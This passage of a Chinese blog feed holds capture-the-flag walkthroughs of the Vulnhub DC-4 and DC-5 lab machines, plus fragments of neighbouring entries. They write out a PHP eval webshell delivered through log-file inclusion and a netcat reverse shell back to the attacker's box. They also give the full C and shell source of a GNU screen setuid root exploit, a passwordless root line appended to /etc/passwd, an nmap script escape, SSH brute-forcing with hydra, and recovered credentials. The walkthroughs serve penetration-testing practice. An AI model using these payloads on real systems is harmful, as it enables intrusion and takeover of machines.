id="另一个脚本"><a href="#另一个脚本" class="headerlink" title="另一个脚本"></a>另一个脚本</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912104612782.png" alt="image-20220912104612782"></p><ul><li>修改文件</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912104815778.png" alt="image-20220912104815778"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912105046646.png" alt="image-20220912105046646"></p><ul><li>保存打开并且监听端口</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912105337056.png" alt="image-20220912105337056"></p><ul><li>监听成功</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912105437350.png" alt="image-20220912105437350"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912105613153.png" alt="image-20220912105613153"></p><ul><li>找到</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graham </span><br><span class="line">GSo7isUM1D4</span><br></pre></td></tr></table></figure><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912105912287.png" alt="image-20220912105912287"></p><ul><li>ssh 登陆成功</li></ul><h2 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912110019034.png" alt="image-20220912110019034"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912110253508.png" alt="image-20220912110253508"></p><ul><li><p>graham用户可以修改&#x2F;home&#x2F;jens&#x2F;backups.sh文件。</p></li><li><p>用echo命令改写&#x2F;home&#x2F;jens&#x2F;backups.sh的内容</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; backups.sh</span><br></pre></td></tr></table></figure><ul><li>用jens的身份执行，得到jens的shell</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912110526604.png" alt="image-20220912110526604"></p><ul><li>查看jens可以sudo执行的命令，发现其可以以root的身份执行nmap命令</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912110602968.png" alt="image-20220912110602968"></p><hr><ul><li>找可以利用的 (没成功)</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912111352884.png" alt="image-20220912111352884"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912111532605.png" alt="image-20220912111532605"></p><hr><ul><li>另一种方法</li></ul><p>nmap工具是可以执行脚本的，那么我们把弹root用户shell的命令写入到nmap的脚本里面，然后用nmap命令执行即可切换到root用户的shell。命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; getShell</span><br><span class="line">sudo  nmap  --script=getShell</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912112254947.png" alt="image-20220912112254947"></p><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机DC系列-DC5</title>
      <link href="/archives/aa142498.html"/>
      <url>/archives/aa142498.html</url>
      
        <content type="html"><![CDATA[<h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><ul><li><strong>Name</strong>: DC: 5</li><li><strong>Date release</strong>: 21 Apr 2019</li><li><strong>Author</strong>: <a href="http://www.vulnhub.com/author/dcau,610/">DCAU</a></li><li><strong>Series</strong>: <a href="http://www.vulnhub.com/series/dc,199/">DC</a></li><li><strong>Web page</strong>: <a href="http://www.five86.com/dc-5.html">http://www.five86.com/dc-5.html</a></li></ul><h1 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h1><p>DC-5 是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>计划是让 DC-5 提高一个档次，所以这对初学者来说可能不是很好，但对于有中级或更好经验的人来说应该没问题。时间会证明一切（反馈也会如此）。</p><p>据我所知，只有一个可利用的入口点可以进入（也没有 SSH）。这个特定的入口点可能很难识别，但它就在那里。您需要寻找一些与众不同的东西（随着页面的刷新而改变的东西）。这有望为漏洞可能涉及的内容提供某种想法。</p><p>只是为了记录，没有涉及 phpmailer 漏洞利用。:-)</p><p>这一挑战的最终目标是获得根并阅读唯一的标志。</p><p>必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。</p><p>对于初学者来说，谷歌可以提供很大的帮助，但你可以随时在@DCAU7 上给我发推文，寻求帮助，让你重新开始。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p><p>但如果你真的，真的被卡住了，你可以观看这个展示第一步的视频。</p><h2 id="技术信息"><a href="#技术信息" class="headerlink" title="技术信息"></a>技术信息</h2><p>DC-5 是基于 Debian 64 位构建的 VirtualBox VM，但在大多数 PC 上运行它应该没有任何问题。</p><p>我已经在 VMWare Player 上对此进行了测试，但如果在 VMware 中运行此 VM 有任何问题，请通读此内容。</p><p>它当前配置为桥接网络，但是，可以根据您的要求进行更改。网络配置为 DHCP。</p><p>安装很简单 - 下载它，解压缩，然后将它导入 VirtualBox 或 VMWare，然后就可以了。</p><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="存活主机"><a href="#存活主机" class="headerlink" title="存活主机"></a>存活主机</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911084525280.png" alt="image-20220911084525280"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dc-5 : 192.168.169.230</span><br><span class="line">kali : 192.168.169.220</span><br></pre></td></tr></table></figure><h2 id="扫描IP"><a href="#扫描IP" class="headerlink" title="扫描IP"></a>扫描IP</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911084829125.png" alt="image-20220911084829125"></p><ul><li>80 先放访问下网页</li></ul><h2 id="网页"><a href="#网页" class="headerlink" title="网页"></a>网页</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911085009888.png" alt="image-20220911085009888"></p><h2 id="扫一下目录"><a href="#扫一下目录" class="headerlink" title="扫一下目录"></a>扫一下目录</h2><ul><li>安装工具</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install dirsearch</span><br></pre></td></tr></table></figure><ul><li>扫描</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.169.230/</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911085942688.png" alt="image-20220911085942688"></p><ul><li>访问目录</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911090136439.png" alt="image-20220911090136439"></p><ul><li><p>这个目录每次刷新日期都会变化</p></li><li><p>并且thankyou.php包含了footer.php页面，尝试使用文件包含漏洞</p></li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911090604740.png" alt="image-20220911090604740"></p><ul><li>随便写点东西 提交,bp抓包</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911090710258.png" alt="image-20220911090710258"></p><ul><li>传入一句话</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;111&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911090930484.png" alt="image-20220911090930484"></p><ul><li>nginx 日志</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911091833231.png" alt="image-20220911091833231"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911092101281.png" alt="image-20220911092101281"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.230/thankyou.php?file=/var/log/nginx/error.log</span><br></pre></td></tr></table></figure><ul><li>连接一句话</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911092241167.png" alt="image-20220911092241167"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911092255438.png" alt="image-20220911092255438"></p><h2 id="nc监听"><a href="#nc监听" class="headerlink" title="nc监听"></a>nc监听</h2><p>kali :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>DC - 5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.169.220 4444 -e /bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911092641289.png" alt="image-20220911092641289"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911092710018.png" alt="image-20220911092710018"></p><ul><li>反弹shell</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911092759247.png" alt="image-20220911092759247"></p><h2 id="寻找带权限的文件夹"><a href="#寻找带权限的文件夹" class="headerlink" title="寻找带权限的文件夹"></a>寻找带权限的文件夹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911093058033.png" alt="image-20220911093058033"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Screen是一个全屏窗口管理器，它在多个进程（通常是交互式shell）之间多路传输物理终端。每个虚拟终端提供DEC VT100终端的功能，以及ANSI X3的几个控制功能。64（ISO 6429）和ISO 2022标准（例如，插入/删除行和支持多个字符集）。每个虚拟终端都有一个回滚历史缓冲区和一个复制粘贴机制，允许用户在窗口之间移动文本区域。当调用screen时，它会创建一个包含shell（或指定命令）的窗口，然后避开您的方式，以便您可以正常使用该程序。然后，您可以随时创建包含其他程序（包括更多shell）的新（全屏）窗口、关闭当前窗口、查看活动窗口列表、打开和关闭输出日志、在窗口之间复制文本、查看滚动历史记录、在窗口之间切换，等等。所有窗口都完全独立运行其程序。当窗口当前不可见时，甚至当整个屏幕会话与用户终端分离时，程序仍继续运行。</span><br></pre></td></tr></table></figure><h2 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911093425215.png" alt="image-20220911093425215"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911094207729.png" alt="image-20220911094207729"></p><h2 id="这份文档要分成三个部分来看"><a href="#这份文档要分成三个部分来看" class="headerlink" title="这份文档要分成三个部分来看"></a>这份文档要分成三个部分来看</h2><ul><li>第一部的</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911095559174.png" alt="image-20220911095559174"></p><p>新建文件 libhax.c 先将第一部分内容写到 libhax.c 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br></pre></td></tr></table></figure><ul><li>第二部分</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911095840987.png" alt="image-20220911095840987"></p><ul><li>新建文件  rootshell.c  第二部分保存到  rootshell.c</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><ul><li>第三部分</li></ul><p>新建 dc5.sh  </p><p>将最后一部分代码写入dc5.sh文件中。需要注意的是，需要在文件开头写入<code>#!/bin/bash</code>表示执行环境。最后保存是需要输入<code>:set ff=unix</code>是为了防止脚本的格式错误。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure><ul><li>上传</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911102542262.png" alt="image-20220911102542262"></p><h1 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h1><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911110027313.png" alt="image-20220911110027313"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220911110043851.png" alt="image-20220911110043851"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机DC系列-DC4</title>
      <link href="/archives/dd13140e.html"/>
      <url>/archives/dd13140e.html</url>
      
        <content type="html"><![CDATA[<h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><ul><li><strong>Name</strong>: DC: 4</li><li><strong>Date release</strong>: 7 Apr 2019</li><li><strong>Author</strong>: <a href="http://www.vulnhub.com/author/dcau,610/">DCAU</a></li><li><strong>Series</strong>: <a href="http://www.vulnhub.com/series/dc,199/">DC</a></li><li><strong>Web page</strong>: <a href="http://www.five86.com/dc-4.html">http://www.five86.com/dc-4.html</a></li></ul><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p>DC-4 是另一个特意建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>与之前的 DC 版本不同，这个版本主要是为初学者&#x2F;中级者设计的。只有一个标志，但从技术上讲，有多个入口点，就像上次一样，没有线索。</p><p>必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。</p><p>对于初学者来说，谷歌可以提供很大的帮助，但你可以随时在@DCAU7 上给我发推文，寻求帮助，让你重新开始。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p><h2 id="技术信息"><a href="#技术信息" class="headerlink" title="技术信息"></a>技术信息</h2><p>DC-4 是基于 Debian 32 位构建的 VirtualBox VM，因此在大多数 PC 上运行它应该没有问题。</p><p>如果在 VMware 中运行此 VM 有任何问题，请通读此内容。</p><p>它当前配置为桥接网络，但是，可以根据您的要求进行更改。网络配置为 DHCP。</p><p>安装很简单 - 下载它，解压缩，然后将其导入 VirtualBox，然后就可以了。</p><h2 id="重要的"><a href="#重要的" class="headerlink" title="重要的"></a>重要的</h2><p>虽然使用此 VM 应该没有问题，但通过下载它，您将对此 VM 可能造成的任何意外损坏承担全部责任。</p><p>这么说应该没什么问题，但我觉得有必要把它扔在那里以防万一。</p><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="扫描存活主机"><a href="#扫描存活主机" class="headerlink" title="扫描存活主机"></a>扫描存活主机</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908091019299.png" alt="image-20220908091019299"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali 192.168.169.220</span><br><span class="line">dc-4 192.168.169.225</span><br></pre></td></tr></table></figure><h2 id="扫描ip"><a href="#扫描ip" class="headerlink" title="扫描ip"></a>扫描ip</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.169.225</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908091212925.png" alt="image-20220908091212925"></p><ul><li>开启了<code>80</code> <code>22</code> 两个端口</li></ul><h2 id="访问http"><a href="#访问http" class="headerlink" title="访问http"></a>访问http</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908091429029.png" alt="image-20220908091429029"></p><ul><li>不像之前的cms可以直接利用</li></ul><h2 id="burpsuit爆破"><a href="#burpsuit爆破" class="headerlink" title="burpsuit爆破"></a>burpsuit爆破</h2><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908092003798.png" alt="image-20220908092003798"></h3><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908092038742.png" alt="image-20220908092038742"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908094945807.png" alt="image-20220908094945807"></p><ul><li>爆破出账号密码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">happy</span><br></pre></td></tr></table></figure><h2 id="登陆后台"><a href="#登陆后台" class="headerlink" title="登陆后台"></a>登陆后台</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908095126910.png" alt="image-20220908095126910"></p><ul><li>点击command</li><li>发现点击run会执行命令</li><li>burpsuit抓包到重放器</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908095342920.png" alt="image-20220908095342920"></p><ul><li>执行个whoami</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908095447532.png" alt="image-20220908095447532"></p><ul><li>执行其他的命令试试</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908095811170.png" alt="image-20220908095811170"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908100015385.png" alt="image-20220908100015385"></p><ul><li>去用户的目录下转转</li><li>在jim下发现备份文件</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908100851019.png" alt="image-20220908100851019"></p><ul><li>发现 old-passwords 继续访问</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908101028242.png" alt="image-20220908101028242"></p><ul><li>发现一堆密码</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908101225477.png" alt="image-20220908101225477"></p><ul><li>还有ssh没用上,爆破ssh试试</li></ul><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><ul><li>用上面的密码列表爆破ssh的密码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim  -P password.txt ssh://192.168.169.225</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908113333627.png" alt="image-20220908113333627"></p><ul><li>得到密码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login: jim   </span><br><span class="line">password: jibril04</span><br></pre></td></tr></table></figure><h3 id="登录ssh"><a href="#登录ssh" class="headerlink" title="登录ssh"></a>登录ssh</h3><ul><li>我自己电脑重启了一下 IP :  192.168.169.226</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908123429678.png" alt="image-20220908123429678"></p><ul><li>提示说有一封邮件</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908123628249.png" alt="image-20220908123628249"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908123734820.png" alt="image-20220908123734820"></p><ul><li>信里提到另一个用户的密码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Charles</span><br><span class="line">^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure><ul><li>切换到Charles</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su charles</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908124108338.png" alt="image-20220908124108338"></p><ul><li>看一下权限</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908124252364.png" alt="image-20220908124252364"></p><ul><li>发现一条命令,看一下功能</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">teehee --help</span><br></pre></td></tr></table></figure><ul><li>百度一下 可以利用提权</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908124536618.png" alt="image-20220908124536618"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908124704311.png" alt="image-20220908124704311"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;putdown.top::0:0:root:/root:/bin/bash&quot; | sudo teehee -a  /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908130306225.png" alt="image-20220908130306225"></p><ul><li>切换用户.获得root权限</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220908130654421.png" alt="image-20220908130654421"></p><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机DC系列-DC3.2</title>
      <link href="/archives/31f7836.html"/>
      <url>/archives/31f7836.html</url>
      
        <content type="html"><![CDATA[<h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><ul><li><strong>Name</strong>: DC: 3.2</li><li><strong>Date release</strong>: 25 Apr 2020</li><li><strong>Author</strong>: <a href="http://www.vulnhub.com/author/dcau,610/">DCAU</a></li><li><strong>Series</strong>: <a href="http://www.vulnhub.com/series/dc,199/">DC</a></li><li><strong>Web page</strong>: <a href="http://www.five86.com/dc-3.html">http://www.five86.com/dc-3.html</a></li></ul><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p>DC-3 是另一个特意建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>与之前的 DC 版本一样，这个版本是为初学者设计的，虽然这一次，只有一个标志，一个入口点，根本没有任何线索。</p><p>必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。</p><p>对于初学者来说，谷歌可以提供很大的帮助，但你可以随时在@DCAU7 上给我发推文，寻求帮助，让你重新开始。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p><p>对于那些有 CTF 和 Boot2Root 挑战经验的人来说，这可能不会花你很长时间（事实上，它可能会花费你不到 20 分钟的时间）。</p><p>如果是这种情况，并且如果您希望它更具挑战性，您可以随时重做挑战并探索其他获得根和获得旗帜的方法。</p><h2 id="技术信息"><a href="#技术信息" class="headerlink" title="技术信息"></a>技术信息</h2><p>DC-3 是基于 Ubuntu 32 位构建的 VirtualBox VM，因此在大多数 PC 上运行它应该没有问题。</p><p>请注意：报告了 DC-3 无法与 VMware Workstation 一起使用的问题。为了解决这个问题，我建议使用 VirtualBox，但是，我为那些只能使用 VMware 的人创建了一个单独的 DC-3 VMware 版本。</p><p>它当前配置为桥接网络，但是，可以根据您的要求进行更改。网络配置为 DHCP。</p><p>安装很简单 - 下载它，解压缩，然后将其导入 VirtualBox，然后就可以了。</p><h2 id="虚拟机设置"><a href="#虚拟机设置" class="headerlink" title="虚拟机设置"></a>虚拟机设置</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907093401804.png" alt="image-20220907093401804"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907093249198.png" alt="image-20220907093249198"></p><h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><h2 id="扫描存活主机"><a href="#扫描存活主机" class="headerlink" title="扫描存活主机"></a>扫描存活主机</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907093526692.png" alt="image-20220907093526692"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dc-3 ip :192.168.169.224</span><br><span class="line">kali ip :192.168.169.220</span><br></pre></td></tr></table></figure><h2 id="扫描IP"><a href="#扫描IP" class="headerlink" title="扫描IP"></a>扫描IP</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907093928999.png" alt="image-20220907093928999"></p><ul><li>开启了 80 端口 ;直接访问</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907094148779.png" alt="image-20220907094148779"></p><h1 id="搜索并利用漏洞"><a href="#搜索并利用漏洞" class="headerlink" title="搜索并利用漏洞"></a>搜索并利用漏洞</h1><ul><li><p>发现是 Joomla 的框架 ; 使用 JoomScan 扫描 